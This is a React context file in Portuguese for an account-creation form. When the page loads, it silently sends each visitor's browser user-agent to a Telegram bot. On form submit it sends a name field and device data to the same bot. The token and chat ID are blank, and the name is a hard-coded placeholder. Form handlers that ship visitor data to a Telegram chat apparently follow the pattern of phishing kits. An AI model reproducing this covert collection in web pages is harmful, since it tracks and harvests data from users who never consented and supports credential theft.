import { createContext, useContext } from "react";
import { useEffect } from "react";


const UseContextForm = createContext();

export const AuthCriarConta = () => {
    const context = useContext(UseContextForm);
    return context
}

const ContextCriarConta = ({ children }) => {
  const criarConta = (e) => {
    e.preventDefault();
    const dispositivo = navigator.userAgent;
    const botToken = "";
    const chatId = "";

    const message = `🧑‍🦰Nome: ${"nome"}\n📱Dispositivo:${dispositivo}`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.ok) {
          console.log("Mensagem enviada com sucesso!");
        } else {
          console.log("Erro ao enviar a mensagem.");
        }
      })
      .catch((error) => console.log("Erro: ", error));
  };

  function captureDispositivo() {
    const dispositivo = navigator.userAgent;

    const message = `📱Dispositivo:${dispositivo}`;
    const botToken = "";
    const chatId = "";

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        if (data.ok) {
          console.log("Mensagem enviada com sucesso!");
        } else {
          console.log("Erro ao enviar a mensagem.");
        }
      })
      .catch((error) => console.log("Erro: ", error));
  }

  useEffect(() => {
    captureDispositivo();
  }, []);

  return (
    <UseContextForm.Provider value={{ criarConta }}>
      {children}
    </UseContextForm.Provider>
  );
};

export default ContextCriarConta;
